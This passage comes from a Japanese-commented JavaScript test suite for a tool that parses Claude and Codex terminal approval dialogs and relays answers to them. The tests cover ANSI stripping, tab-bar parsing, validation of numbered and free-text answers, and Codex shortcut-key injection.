  assertEq(
    'object でも num 範囲外 → null',
    validateMultiAnswer([{ num: '9', text: 'a' }, '2', '3'], tabsFT),
    null
  )
  assertEq(
    '配列要素が配列 → null',
    validateMultiAnswer([['1'], '2', '3'], tabs),
    null
  )
  assertEq(
    '配列要素が数値 → null',
    validateMultiAnswer([1, '2', '3'], tabs),
    null
  )

  // D1 (codex B002 修正): 通常 option に text 添付 → reject
  assertEq(
    'num=1(通常 option "a")に text 添付 → null',
    validateMultiAnswer([{ num: '1', text: 'hello' }, '2', '3'], tabsFT),
    null
  )
  // D1 (codex B002 修正): Chat about this を指す num → reject(text 有無に関わらず)
  assertEq(
    'num=5(Chat about this)を指す → null',
    validateMultiAnswer([{ num: '5' }, '2', '3'], tabsFT),
    null
  )
  assertEq(
    'num=5(Chat about this)+ text → null',
    validateMultiAnswer([{ num: '5', text: 'hi' }, '2', '3'], tabsFT),
    null
  )
}

// -------------------------------------------------------
// 11. parseDialog はタブ式入力でも単一タブとして解釈する(sweep 前提)
// -------------------------------------------------------
console.log('\n[11] parseDialog はタブ式入力の現タブのみ抽出')
{
  // タブ式 UI でも parseDialog は現在見えているタブの ❯ + 選択肢を抽出する
  const buf = [
    '□統合方式 □図再生成 ✓整理 ✓Submit →',
    '─────',
    ' 新候補を既存レポートにどう統合しますか?',
    ' ❯ 1. 7→9 候補化',
    '   2. 新ゾーン追加',
    '   3. 補遺ファイル追記のみ',
    ' Esc to cancel · Tab/Arrow keys to navigate',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  assertEq('options 数 = 3', r && r.options.length, 3)
  assertEq('現タブの prompt が取れる', r && r.prompt.includes('新候補'), true)
  assertEq('isTabbedDialog も true', isTabbedDialog(buf), true)
}

// -------------------------------------------------------
// 12. isTabbedDialog: 実 Claude TUI が出す ☐ (U+2610) / ✔ (U+2714) を検出
// -------------------------------------------------------
console.log('\n[12] isTabbedDialog: 実 TUI ユニコード (☐ U+2610 / ✔ U+2714)')
{
  // 実環境で観測された描画(2026-05-13 ログ): ☐ と ✔ が混在
  const realTabbed = '← ☐ 食事タイプ ☐ 飲み物 ☐ 生活リズム ✔ Submit → Tab/Arrow keys to navigate'
  assertEq('☐ + ✔ + → → true', isTabbedDialog(realTabbed), true)
  // フォールバック ユニコード(□ U+25A1 / ✓ U+2713)も引き続き検出可能
  const fallbackTabbed = '□ a □ b ✓ Submit →'
  assertEq('□ + ✓ + → → true (旧 unicode 互換)', isTabbedDialog(fallbackTabbed), true)
  // 混在も OK
  const mixed = '☐ a □ b ✓ c ✔ Submit →'
  assertEq('混在 unicode + → → true', isTabbedDialog(mixed), true)
}

// -------------------------------------------------------
// 13. parseDialog: 改行無し + タブバー描画 (ConPTY 実描画相当)
// -------------------------------------------------------
console.log('\n[13] parseDialog: \\n 無しタブバー描画から prompt 抽出')
{
  // stripAnsi 後の ConPTY 描画は CSI B (↓1 行) が消えて \n が残らない。
  // タブバーが prompt に混入しないか確認(v1.11.0 で発生していたバグ)。
  const buf =
    '──────────────────────────────────── ' +
    '← ☐ 食事タイプ ☐ 飲み物 ☐ 生活リズム ✔ Submit → ' +
    '朝食派ですか、それとも夜食派ですか? ' +
    '❯ 1. 朝食派 朝にしっかり食べるのが好き ' +
    '2. 夜食派 夜遅くに食べるのが好き ' +
    '3. どちらも 朝も夜も両方楽しむ ' +
    '4. Type something. ' +
    '──────────────────────────────────── ' +
    'Enter to select · Tab/Arrow keys to navigate · Esc to cancel'
  const r = parseDialog(buf)
  assertEq('parseDialog 検出 → ok', !!r, true)
  if (r) {
    assertEq(
      'prompt にタブバー文字が混入しない (☐ 無)',
      r.prompt.includes('☐'),
      false
    )
    assertEq('prompt にタブバー文字が混入しない (✔ 無)', r.prompt.includes('✔'), false)
    assertEq('prompt にタブバー文字が混入しない (← 無)', r.prompt.includes('←'), false)
    assertEq(
      'prompt 本文が抽出されている',
      r.prompt.includes('朝食派ですか'),
      true
    )
  }
  assertEq('isTabbedDialog も true', isTabbedDialog(buf), true)
}

// -------------------------------------------------------
// 14. stripAnsi: CSI B / E を改行に変換
// -------------------------------------------------------
console.log('\n[14] stripAnsi: CSI B / E → \\n 変換')
{
  // ConPTY は行送りに CSI B (Cursor Down) を使う。改行へ変換しないと
  // parseDialog が行構造を失い、行頭マーカーが認識できなくなる。
  assertEq('CSI 1 B → \\n', stripAnsi('A\x1b[1BB'), 'A\nB')
  assertEq('CSI 単独 B → \\n', stripAnsi('A\x1b[BB'), 'A\nB')
  // v1.11.2 で stripAnsi に \n{3,}→\n\n のスピナー圧縮が入ったため、
  // CSI 3 B(\n × 3)は最終的に \n × 2 へ圧縮される。
  assertEq('CSI 3 B → 圧縮で \\n × 2', stripAnsi('A\x1b[3BB'), 'A\n\nB')
  assertEq('CSI E (Next Line) → \\n', stripAnsi('A\x1b[EB'), 'A\nB')
  assertEq(
    'CSI B と C は併存可能',
    stripAnsi('A\x1b[1B\x1b[2CB'),
    'A\n  B'
  )
}

// -------------------------------------------------------
// 15. parseDialog: 生 ANSI 描画(CSI B 含む)からの抽出
// -------------------------------------------------------
console.log('\n[15] parseDialog: 生 ANSI タブ式描画から prompt/options 抽出')
{
  // ConPTY 風: 行送りに CSI B、列ジャンプに CSI C、色は CSI m。
  // stripAnsi で CSI B → \n に変換されることを前提とする。
  const buf =
    '\x1b[38;5;246m────\x1b[39m\x1b[1B' +
    '← ☐ 食事タイプ\x1b[1C☐\x1b[1C飲み物\x1b[2C☐\x1b[1C生活リズム\x1b[2C✔\x1b[1CSubmit\x1b[2C→\x1b[1B' +
    '朝食派ですか、それとも夜食派ですか?\x1b[1B' +
    '\x1b[38;5;153m❯\x1b[39m 1.\x1b[1C朝食派\x1b[1B' +
    '\x1b[2C2.\x1b[1C夜食派\x1b[1B' +
    '\x1b[2C3.\x1b[1Cどちらも\x1b[1B' +
    '\x1b[38;5;246m────\x1b[39m\x1b[1B' +
    'Esc to cancel'
  const cleaned = stripAnsi(buf)
  const r = parseDialog(cleaned)
  assertEq('検出できる', !!r, true)
  if (r) {
    assertEq('prompt がクリーン', r.prompt, '朝食派ですか、それとも夜食派ですか?')
    assertEq('options 数 = 3', r.options.length, 3)
    assertEq('option[0] = "朝食派"', r.options[0], '朝食派')
    assertEq('option[1] = "夜食派"', r.options[1], '夜食派')
    assertEq('option[2] = "どちらも"', r.options[2], 'どちらも')
  }
}

// -------------------------------------------------------
// 16. parseDialog: prompt 本文に → を含むタブ式ダイアログ
// -------------------------------------------------------
console.log('\n[16] parseDialog: prompt 本文に → を含んでもタブバー側を行末扱い')
{
  // タブバー右端の → が「最終 →」ではなく、prompt 本文の → が最終になるケース。
  // arrowIdx が prompt 内の → を拾うと lineStart が prompt 途中に来て本文断片化する。
  // 修正後: → の採用条件「タブマーカー後ろ」、なければタブマーカー末尾代用 で防止。
  // 構造: タブバー〜prompt は空白連結(arrowIdx ブランチ起動条件)、
  // prompt 後と options 間は \n(実 PTY で CSI B が \n に変換された後の状態)
  const buf =
    '──── ' +
    '← ☐ a ☐ b ☐ c ✔ Submit → ' +
    'バージョンを 5 → 10 に上げますか?\n' +
    ' ❯ 1. はい\n' +
    '   2. いいえ\n' +
    '──── ' +
    'Esc to cancel Tab/Arrow keys to navigate'
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  if (r) {
    // タブバー右端 `→` がタブマーカー (☐/✔) より後にあるためそこを採用
    // → prompt は「バージョンを 5 → 10 に上げますか?」全体
    assertEq(
      'prompt 本文が断片化していない',
      r.prompt.includes('バージョンを 5'),
      true
    )
    assertEq(
      'prompt にタブバー文字 (☐) が混入しない',
      r.prompt.includes('☐'),
      false
    )
    assertEq(
      'prompt にタブバー文字 (←) が混入しない',
      r.prompt.includes('←'),
      false
    )
    assertEq('options 数 = 2', r.options.length, 2)
  }
}

// -------------------------------------------------------
// 17. parseDialog: → 無しタブバー UI(Tab/Arrow keys ヒントのみ)
// -------------------------------------------------------
console.log('\n[17] parseDialog: → 無し UI でもタブマーカー末尾を行頭代用')
{
  // タブバーが ← も → も持たず、☐/✔ のみで構成される環境(将来の UI 変化想定)。
  // isTabbedDialog は `→ OR Tab/Arrow keys` の OR で true → parseDialog 側で
  // → が見つからなくてもタブマーカー末尾を使って prompt を切り出せること。
  const buf =
    '──── ' +
    '☐ a ☐ b ✔ Submit ' +
    'コーヒー派か紅茶派ですか?\n' +
    ' ❯ 1. コーヒー\n' +
    '   2. 紅茶\n' +
    'Tab/Arrow keys to navigate Esc to cancel'
  const r = parseDialog(buf)
  assertEq('検出できる', !!r, true)
  if (r) {
    assertEq(
      'prompt 本文がクリーン',
      r.prompt,
      'コーヒー派か紅茶派ですか?'
    )
    assertEq(
      'prompt にタブバー文字 (☐) が混入しない',
      r.prompt.includes('☐'),
      false
    )
    assertEq('options 数 = 2', r.options.length, 2)
  }
  assertEq('isTabbedDialog も true', isTabbedDialog(buf), true)
}

// -------------------------------------------------------
// 18. promptSimilar: 日本語 prompt の類似度判定が機能する
// -------------------------------------------------------
console.log('\n[18] promptSimilar: 日本語 prompt 対応')
{
  // 旧 normalizePrompt は /[^a-z0-9]/ で日本語を全削除 → 常に空文字列 →
  // promptSimilar が !na.length で false 返却 = タブ式 sweep が完全破綻していた。
  // 修正後は空白/罫線のみ除去、本文(日本語含む)は保持する。
  // promptSimilar は module から直接 export していないが、内部利用される
  // dialogShapeMatches 経由で挙動を確認する。
  const { stripAnsi } = require('./claude-wrapper.js')
  // 副次的に: stripAnsi が日本語を破壊しないことも確認
  assertEq(
    'stripAnsi が日本語を保持',
    stripAnsi('朝食派ですか、夜食派ですか?'),
    '朝食派ですか、夜食派ですか?'
  )
  // parseDialog 経由で「異なる日本語 prompt」が区別されることを確認
  const buf1 = [
    '─────',
    ' 朝食派ですか、夜食派ですか?',
    ' ❯ 1. 朝食派',
    '   2. 夜食派',
    ' Esc to cancel',
  ].join('\n')
  const buf2 = [
    '─────',
    ' コーヒー派か紅茶派か?',
    ' ❯ 1. コーヒー',
    '   2. 紅茶',
    ' Esc to cancel',
  ].join('\n')
  const r1 = parseDialog(buf1)
  const r2 = parseDialog(buf2)
  assertEq('buf1 検出', !!r1, true)
  assertEq('buf2 検出', !!r2, true)
  assertEq('異なる日本語 prompt が異なる結果', r1.prompt !== r2.prompt, true)
}

// -------------------------------------------------------
// 19. screenTextFromBuffer: 画面バッファ → テキスト化(v1.11.2 新設)
//     実 xterm を経由した生 ANSI → 検出の回帰確認はログ解析モード
//     (node test-parse-dialog.js <pty.log>)で行う。ここでは純粋関数として
//     「baseY 起点 + スクロールバック + trimRight + \n join」のロジックを検証。
// -------------------------------------------------------
console.log('\n[19] screenTextFromBuffer: 画面バッファのテキスト化ロジック')
{
  // @xterm/headless の IBuffer / IBufferLine を模したモック。
  // translateToString(true) は trimRight 相当。
  function mockBuffer(lines, baseY) {
    return {
      baseY,
      length: lines.length,
      getLine(y) {
        if (y < 0 || y >= lines.length) return null
        return {
          translateToString(trimRight) {
            return trimRight ? lines[y].replace(/\s+$/, '') : lines[y]
          },
        }
      },
    }
  }

  // 基本: baseY=0, rows=4, scrollback=40 → 全 4 行を \n join + trimRight
  const buf1 = mockBuffer(
    ['  line0 padding   ', 'line1', '', '❯ 1. Yes   '],
    0
  )
  assertEq(
    '基本: trimRight + \\n join',
    screenTextFromBuffer(buf1, 4, 40),
    '  line0 padding\nline1\n\n❯ 1. Yes'
  )

  // スクロールバック: baseY=10, scrollback=3 → 表示領域 (10..10+rows) + 手前 3 行
  const lines2 = []
  for (let i = 0; i < 15; i++) lines2.push('L' + i)
  const buf2 = mockBuffer(lines2, 10)
  // startLine = max(0, 10-3) = 7、endLine = 10+2 = 12 → L7..L11
  assertEq(
    'スクロールバック分さかのぼる',
    screenTextFromBuffer(buf2, 2, 3),
    'L7\nL8\nL9\nL10\nL11'
  )

  // baseY - scrollbackLines が負になる場合は 0 にクランプ
  const buf3 = mockBuffer(['a', 'b', 'c'], 1)
  // startLine = max(0, 1-40) = 0、endLine = 1+2 = 3 → a,b,c
  assertEq('startLine 負クランプ', screenTextFromBuffer(buf3, 2, 40), 'a\nb\nc')

  // endLine が buffer.length を超える場合は length で打ち切り
  const buf4 = mockBuffer(['x', 'y'], 0)
  // endLine = 0+10 = 10 だが length=2 で打ち切り
  assertEq('endLine が length 超過時は打ち切り', screenTextFromBuffer(buf4, 10, 40), 'x\ny')

  // getLine が null を返す行はスキップ
  const buf5 = {
    baseY: 0,
    length: 3,
    getLine(y) {
      if (y === 1) return null
      return { translateToString: () => 'row' + y }
    },
  }
  assertEq('getLine null はスキップ', screenTextFromBuffer(buf5, 3, 40), 'row0\nrow2')
}

// -------------------------------------------------------
// 20. validateFreeText: v1.12.0 フリーテキスト送信のサニタイズ defense in depth
// -------------------------------------------------------
console.log('\n[20] validateFreeText: 制御文字 / 長さ / 型チェック')
{
  // table-driven: [label, input, expected] の組で網羅。
  // 期待値が input そのままなら通過、null なら reject。
  const cases = [
    // 正常系
    ['通常テキスト', 'Hello, world!', 'Hello, world!'],
    ['日本語テキスト', 'こんにちは、世界', 'こんにちは、世界'],
    ['記号入り', 'What is 1+1? = 2', 'What is 1+1? = 2'],
    ['2000 文字 (上限ちょうど)', 'a'.repeat(2000), 'a'.repeat(2000)],
    // 型違反
    ['null → null', null, null],
    ['undefined → null', undefined, null],
    ['数値 → null', 42, null],
    ['配列 → null', ['a'], null],
    ['オブジェクト → null', {}, null],
    // 長さ
    ['空文字 → null', '', null],
    ['2001 文字 → null', 'a'.repeat(2001), null],
    // 制御文字
    ['改行 (\\n) → null', 'a\nb', null],
    ['CR (\\r) → null', 'a\rb', null],
    ['Tab (\\t) → null', 'a\tb', null],
    ['ESC (\\x1b) → null', 'a\x1bb', null],
    ['Ctrl-C (\\x03) → null', 'a\x03b', null],
    ['NUL (\\x00) → null', 'a\x00b', null],
    ['DEL (\\x7F) → null', 'a\x7Fb', null],
    ['画面クリアエスケープ → null', '\x1b[2J\x1b[H', null],
    ['Ctrl-C 単体 → null', '\x03', null],
  ]
  for (const [label, input, expected] of cases) {
    assertEq(label, validateFreeText(input), expected)
  }
}

// -------------------------------------------------------
// 21. 定数 / 正規表現の 3 ファイル同期(v1.12.0 D3, codex suggestion s1)
// MAX_FREE_TEXT_LEN / FREE_TEXT_OPTION_RE / CHAT_ABOUT_RE が
// claude-wrapper.js / approval-server.js / approval-ui.html の 3 ファイルで
// 一致していることを検証(将来のズレを検出)
// -------------------------------------------------------
console.log('\n[21] 定数 / 正規表現の 3 ファイル同期')
{
  const path = require('path')
  const root = __dirname
  const wrapperSrc = fs.readFileSync(path.join(root, 'claude-wrapper.js'), 'utf-8')
  const serverSrc = fs.readFileSync(path.join(root, 'approval-server.js'), 'utf-8')
  const uiSrc = fs.readFileSync(path.join(root, 'approval-ui.html'), 'utf-8')

  // MAX_FREE_TEXT_LEN は const 定義行(= 2000)を抽出
  const maxLen = (src) => {
    const m = src.match(/MAX_FREE_TEXT_LEN\s*=\s*(\d+)/)
    return m ? m[1] : null
  }
  assertEq('MAX_FREE_TEXT_LEN (wrapper)', maxLen(wrapperSrc), '2000')
  assertEq('MAX_FREE_TEXT_LEN (server)', maxLen(serverSrc), '2000')
  assertEq('MAX_FREE_TEXT_LEN (UI)', maxLen(uiSrc), '2000')
  // textarea の maxlength 属性も同期
  const m = uiSrc.match(/maxlength="(\d+)"/)
  assertEq('UI textarea maxlength も同期', m ? m[1] : null, '2000')

  // 正規表現リテラルを文字列として抽出して比較
  const reSource = (src, name) => {
    const re = new RegExp(`${name}\\s*=\\s*/([^/]+)/i`)
    const m = src.match(re)
    return m ? m[1] : null
  }
  const expectedFT = '^Type\\s+something\\.?$'
  assertEq('FREE_TEXT_OPTION_RE (wrapper)', reSource(wrapperSrc, 'FREE_TEXT_OPTION_RE'), expectedFT)
  assertEq('FREE_TEXT_OPTION_RE (server)', reSource(serverSrc, 'FREE_TEXT_OPTION_RE'), expectedFT)
  assertEq('FREE_TEXT_OPTION_RE (UI)', reSource(uiSrc, 'FREE_TEXT_OPTION_RE'), expectedFT)

  const expectedCA = '^Chat\\s+about\\s+this\\.?$'
  assertEq('CHAT_ABOUT_RE (wrapper)', reSource(wrapperSrc, 'CHAT_ABOUT_RE'), expectedCA)
  assertEq('CHAT_ABOUT_RE (server)', reSource(serverSrc, 'CHAT_ABOUT_RE'), expectedCA)
  assertEq('CHAT_ABOUT_RE (UI)', reSource(uiSrc, 'CHAT_ABOUT_RE'), expectedCA)

  // v1.12.0 (codex 2nd round suggestion s1): 前方一致しない負例。
  // "Type something custom" のような通常選択肢が誤マッチしないことを保証。
  const ftRE = /^Type\s+something\.?$/i
  const caRE = /^Chat\s+about\s+this\.?$/i
  assertEq('FT 正例 "Type something"', ftRE.test('Type something'), true)
  assertEq('FT 正例 "Type something."', ftRE.test('Type something.'), true)
  assertEq('FT 負例 "Type something custom" → false', ftRE.test('Type something custom'), false)
  assertEq('FT 負例 "Type somethings"(末尾文字)→ false', ftRE.test('Type somethings'), false)
  assertEq('CA 正例 "Chat about this"', caRE.test('Chat about this'), true)
  assertEq('CA 正例 "Chat about this."', caRE.test('Chat about this.'), true)
  assertEq('CA 負例 "Chat about this proposal" → false', caRE.test('Chat about this proposal'), false)
}

// -------------------------------------------------------
// 22. 境界文字定数の membership 固定(drift ガード)
// claude-wrapper.js の境界文字を単一ソース化したため、集合のメンバーが
// 不用意に変わると検出挙動が変わる。集合を凍結して回帰を検知する。
// -------------------------------------------------------
console.log('\n[22] 境界文字定数の membership')
{
  assertEq('BOX_CHARS', BOX_CHARS, '│╭╮╰╯─╌')
  assertEq('RULE_CHARS', RULE_CHARS, '─╌')
  assertEq('PROMPT_BOX_ANCHOR_CHARS', PROMPT_BOX_ANCHOR_CHARS, '│─╌')
  assertEq('TAB_MARK_CHARS', TAB_MARK_CHARS, '☐✔□✓')
  assertEq('TAB_ARROW_CHAR', TAB_ARROW_CHAR, '→')
  assertEq('CURSOR_CHAR', CURSOR_CHAR, '❯')
  // 構造不変条件: LINE_START_CHARS = '\n' + BOX_CHARS、サブセットは BOX_CHARS に内包。
  assertEq('LINE_START_CHARS = \\n + BOX_CHARS', LINE_START_CHARS, '\n' + BOX_CHARS)
  const subsetOfBox = (s) => [...s].every((c) => BOX_CHARS.includes(c))
  assertEq('RULE_CHARS ⊂ BOX_CHARS', subsetOfBox(RULE_CHARS), true)
  assertEq('PROMPT_BOX_ANCHOR_CHARS ⊂ BOX_CHARS', subsetOfBox(PROMPT_BOX_ANCHOR_CHARS), true)
  assertEq('PROMPT_BOX_ANCHOR は ╭╮╰╯ を含まない', /[╭╮╰╯]/.test(PROMPT_BOX_ANCHOR_CHARS), false)
  // タブ印系派生 RegExp はすべて単一ソース由来(凍結カバレッジを TAB_NAV_RE まで対称化)。
  assertEq('TAB_NAV_RE は → を含む', TAB_NAV_RE.test(TAB_ARROW_CHAR), true)
  // char class 直挿入の前提: BOX_CHARS に正規表現メタ文字(- ^ ] \)を入れない(混入すると派生 RE が silent 破損)。
  assertEq('BOX_CHARS にメタ文字なし', /[-^\]\\]/.test(BOX_CHARS), false)
}

// -------------------------------------------------------
// 23. composeEndMarkerPattern: 型付き化 + 後方互換 + footgun 解消
// -------------------------------------------------------
console.log('\n[23] composeEndMarkerPattern')
{
  const DEFAULT_COMPOSED = `${DEFAULT_END_MARKER}|${EXIT_PLAN_END_PATTERN}`
  // config 無し → 現行既定値と完全一致(回帰なし)
  assertEq('config 無し → 既定 pattern', composeEndMarkerPattern(undefined), DEFAULT_COMPOSED)
  assertEq('空オブジェクト → 既定 pattern', composeEndMarkerPattern({}), DEFAULT_COMPOSED)
  // 型付き endMarkers → 両方を OR
  assertEq(
    '型付き {default, exitPlan}',
    composeEndMarkerPattern({ endMarkers: { default: 'AAA', exitPlan: 'BBB' } }),
    'AAA|BBB'
  )
  // 型付き default のみ → exitPlan は既定で補完
  assertEq(
    '型付き default のみ → exitPlan 補完',
    composeEndMarkerPattern({ endMarkers: { default: 'AAA' } }),
    `AAA|${EXIT_PLAN_END_PATTERN}`
  )
  // legacy endMarker → ExitPlan を常に OR(footgun 解消の核心)
  const legacy = composeEndMarkerPattern({ endMarker: 'Esc\\s*to\\s*cancel' })
  assertEq('legacy endMarker に ExitPlan が含まれる', legacy.includes(EXIT_PLAN_END_PATTERN), true)
  // legacy が shift+tab を含めなくても ExitPlanMode フッタを検出できる
  assertEq(
    'legacy でも shift+tab to approve を検出',
    new RegExp(legacy, 'gi').test('shift+tab to approve with this feedback'),
    true
  )
  // 既定 pattern は従来どおり Esc to cancel も検出
  assertEq(
    '既定 pattern は Esc to cancel を検出',
    new RegExp(DEFAULT_COMPOSED, 'gi').test('Esc to cancel'),
    true
  )
}

// -------------------------------------------------------
// 24. isLostRegistration: サーバーが id を失った(404)時の再登録判定
//     真因 = サーバー再起動でメモリキュー揮発 → 旧 id が 404 → 再登録すべき
// -------------------------------------------------------
console.log('[24] isLostRegistration (404 = 登録喪失 → 再登録)')
{
  const e404 = Object.assign(new Error('HTTP 404: Not found'), { statusCode: 404 })
  const e500 = Object.assign(new Error('HTTP 500'), { statusCode: 500 })
  const eNet = new Error('socket hang up') // statusCode 無し(接続断)
  const dlg = { id: 'abc', prompt: 'p' }

  assertEq('404 + 自分の id → 再登録する', isLostRegistration(e404, dlg, 'abc'), true)
  assertEq('500 は再登録しない(従来の sleep 再試行)', isLostRegistration(e500, dlg, 'abc'), false)
  assertEq('接続断(statusCode 無し)は再登録しない', isLostRegistration(eNet, dlg, 'abc'), false)
  assertEq(
    '404 でも別ダイアログに切替後(id 不一致)は再登録しない',
    isLostRegistration(e404, dlg, 'xyz'),
    false
  )
  assertEq('currentDialog 無し → 再登録しない', isLostRegistration(e404, null, 'abc'), false)
  assertEq(
    'id 未採番(null)の dialog には誤適用しない',
    isLostRegistration(e404, { id: null }, 'abc'),
    false
  )
  assertEq('err 無し → false(防御)', isLostRegistration(null, dlg, 'abc'), false)
}

// -------------------------------------------------------
// 25. 単一質問の照合キー安定性(v1.15.6 Fix A の根拠)
//     真因 = サーバー側と wrapper 側が別の parse 瞬間に凍結した options を持ち、
//     option 本文(ラベル+折返した説明文)が揺れるとテキスト完全一致が外れて
//     注入スキップ→永続オーファン。番号(index)は本文に依存しない安定キー。
// -------------------------------------------------------
console.log('[25] 単一質問の照合キー安定性(番号 vs テキスト)')
{
  // 同一ダイアログを別フレームで parse した 2 つの options スナップショット。
  // 件数は同じ(dialogShapeMatches が dedup 通過させる条件)だが、option[0] の
  // 説明文の折返し位置がずれて本文文字列が異なる。
  const snapA = [
    'ハイブリッド収穫(推奨) EN canonical 記事に注釈がある語はそこから',
    'JP 定義を EN 翻訳',
    '収穫できる語のみ EN 公開',
  ]
  const snapB = [
    'ハイブリッド収穫(推奨) EN canonical 記事に注釈がある語はそこから収穫',
    'JP 定義を EN 翻訳',
    '収穫できる語のみ EN 公開',
  ]

  // 旧挙動: スマホが snapA の本文をエコー → wrapper の snapB と完全一致せず null(= バグ)
  assertEq(
    'テキストキーはスナップショット間 drift で外れる(旧バグ)',
    validateAnswer(snapA[0], snapB),
    null
  )
  // 新挙動: 番号は本文に依存せず安定。snapB に対して "1" → "1"
  assertEq('番号 "1" は drift に不変で有効', validateAnswer('1', snapB), '1')
  assertEq('番号 "3" は drift に不変で有効', validateAnswer('3', snapB), '3')
  // 範囲外番号は拒否(bounds check が効く)
  assertEq('範囲外番号 "4" は拒否', validateAnswer('4', snapB), null)
}

// -------------------------------------------------------
// 26. extractCodexShortcut / resolveCodexInjection(Phase 3a)
//     codex のコマンド承認は「番号 + Enter」でなくショートカット(y/p/esc)型。
//     番号を送ると末尾 Enter が既定 option1(承認)を誤確定する(拒否のはずが承認 =
//     failure #Z 同型)。option ラベル末尾の (y)/(p)/(esc) を抽出して注入する純関数。
//     最重要アサート = 抽出失敗(null)時に「番号 + Enter にフォールバックしない」固定。
// -------------------------------------------------------
console.log('[26] extractCodexShortcut / resolveCodexInjection')
{
  // 抽出: codex コマンド承認の 3 択ラベル
  assertEq('(y) → char y', extractCodexShortcut('Yes, proceed (y)'), { kind: 'char', char: 'y' })
  assertEq(
    "(p) → char p(ラベル内に別の括弧 `touch...` があっても末尾優先)",
    extractCodexShortcut("Yes, and don't ask again for commands that start with `touch` (p)"),
    { kind: 'char', char: 'p' }
  )
  assertEq(
    '(esc) → esc',
    extractCodexShortcut('No, and tell Codex what to do differently (esc)'),
    { kind: 'esc' }
  )
  // 安全側 null: プランモード選択肢(Recommended 等)・括弧なし・複数文字・記号
  assertEq('(Recommended) → null(安全側)', extractCodexShortcut('春 (Recommended)'), null)
  assertEq('括弧なし → null', extractCodexShortcut('Yes, proceed'), null)
  assertEq('複数文字トークン → null', extractCodexShortcut('foo (yes)'), null)
  assertEq('空ラベル → null', extractCodexShortcut(''), null)
  assertEq('非文字列 → null(防御)', extractCodexShortcut(null), null)
  assertEq('末尾以外の括弧は無視 → null', extractCodexShortcut('Yes (y) proceed'), null)

  // 注入バイト列: char はその文字のみ(末尾 \r を付けない=誤確定回避)、esc は ESC
  assertEq('char y → bytes "y"(\\r なし)', resolveCodexInjection('Yes, proceed (y)'), {
    bytes: 'y',
  })
  assertEq('esc → bytes ESC(\\x1b)', resolveCodexInjection('No... (esc)'), { bytes: '\x1b' })
  // ★中核: 抽出不能ラベルは null → 呼び出し側は番号 + Enter に倒さず注入しない(#Z 防止)
  assertEq('抽出不能 → null(番号+Enter にフォールバックしない)', resolveCodexInjection('春 (Recommended)'), null)
}

// -------------------------------------------------------
// 27. codex コマンド承認 fixture(parseDialog 本番経路、実ログ由来の合成画面)
//     codex 0.142.2 実測 TUI:カーソル › (U+203A)、本体は罫線なしインライン、
//     フッタ "Press enter to confirm or esc to cancel"(既定マーカー esc to cancel に一致)。
//     検出され、options が末尾ショートカット (y)/(p)/(esc) を保持することを固定する。
// -------------------------------------------------------
console.log('[27] codex コマンド承認 fixture(parseDialog)')
{
  const buf = [
    '  Would you like to run the following command?',
    '  $ touch hello.txt',
    '› 1. Yes, proceed (y)',
    '  2. Yes, and don\'t ask again for commands that start with `touch hello.txt` (p)',
    '  3. No, and tell Codex what to do differently (esc)',
    '  Press enter to confirm or esc to cancel',
  ].join('\n')
  const r = parseDialog(buf)
  assertEq('検出できる(カーソル › を認識)', !!r, true)
  assertEq('options 数 = 3', r && r.options.length, 3)
  assertEq('options[0] が (y) を保持', r && /\(y\)\s*$/.test(r.options[0]), true)
  assertEq('options[2] が (esc) を保持', r && /\(esc\)\s*$/.test(r.options[2]), true)
  // 抽出 → 注入の往復(detection と injection の整合を本番ラベルで固定)
  assertEq('option1 → char y', r && resolveCodexInjection(r.options[0]), { bytes: 'y' })
  assertEq('option3 → esc', r && resolveCodexInjection(r.options[2]), { bytes: '\x1b' })
}

// -------------------------------------------------------
// 28. isCodexCommand(Phase 3a / B8 codex-review B001 反映)
//     IS_CODEX 判定漏れは危険(false なら番号 + Enter 経路に落ち codex 既定 option1 を
//     誤確定 = #Z 同型)。basename 正規化 + .exe/.cmd 許容で起動形態の揺れを広く拾い、
//     かつ codex 以外(mycodex / codex-cli 等)は拾わないことを固定する。
// -------------------------------------------------------
console.log('[28] isCodexCommand(起動コマンド判定)')
{
  assertEq('codex → true', isCodexCommand('codex'), true)
  assertEq('絶対パス /usr/bin/codex → true', isCodexCommand('/usr/bin/codex'), true)
  assertEq('相対パス ./codex → true', isCodexCommand('./codex'), true)
  assertEq('codex.exe → true(Windows)', isCodexCommand('codex.exe'), true)
  assertEq('codex.cmd → true(Windows shim)', isCodexCommand('codex.cmd'), true)
  assertEq('大文字 CODEX → true(case-insensitive)', isCodexCommand('CODEX'), true)
  assertEq('claude → false(既存経路維持)', isCodexCommand('claude'), false)
  assertEq('mycodex → false', isCodexCommand('mycodex'), false)
  assertEq('codex-cli → false', isCodexCommand('codex-cli'), false)
  assertEq('codex.sh → false(未許可拡張子)', isCodexCommand('codex.sh'), false)
}

// -------------------------------------------------------
// 結果サマリ
// -------------------------------------------------------
console.log('\n────────────────────────────────────────')
console.log(`  passed: ${passed}, failed: ${failed}`)
console.log('────────────────────────────────────────\n')

// -------------------------------------------------------
// オプション: 実 PTY ログを追加で解析
// v1.11.2: 本番経路(onPtyData がチャンク単位で headlessTerm.write → detectDialog)
// をシミュレートする。ログを固定サイズで分割しながら write し、再生途中のどこかで
// parseDialog が成功する瞬間があるかを確認する。最終画面だけ見ると、ユーザーが既に
// 回答済みのログでは検出できないため(ダイアログが画面から消えている)、
// 「再生中に一度でも検出できたか」を判定基準とする。
// -------------------------------------------------------
const logPath = process.argv[2]
if (logPath) {
  if (!fs.existsSync(logPath)) {
    console.error(`ログファイルが見つかりません: ${logPath}`)
    process.exit(failed ? 2 : 1)
  }
  const { Terminal } = require('@xterm/headless')
  const raw = fs.readFileSync(logPath, 'utf8')
  console.log(`[log] ${logPath}: ${raw.length} bytes`)
  const hterm = new Terminal({
    cols: 120,
    rows: 30,
    scrollback: 1000,
    allowProposedApi: true,
  })
  const CHUNK = 512
  let offset = 0
  let detected = null
  let detectedAt = -1

  function finishLog() {
    if (detected) {
      console.log(
        `✅ parseDialog → 検出成功 (再生 ${detectedAt}/${raw.length} bytes 時点)`
      )
      console.log(`  prompt : ${JSON.stringify(detected.prompt)}`)
      console.log(`  tool   : ${detected.tool}`)
      console.log(`  args   : ${JSON.stringify(detected.args)}`)
      console.log(`  options: ${JSON.stringify(detected.options, null, 2)}`)
    } else {
      console.log('❌ parseDialog → null (再生中のどの時点でも検出できず)')
    }
    hterm.dispose()
    process.exit(failed || !detected ? 2 : 0)
  }

  function stepLog() {
    if (offset >= raw.length) {
      finishLog()
      return
    }
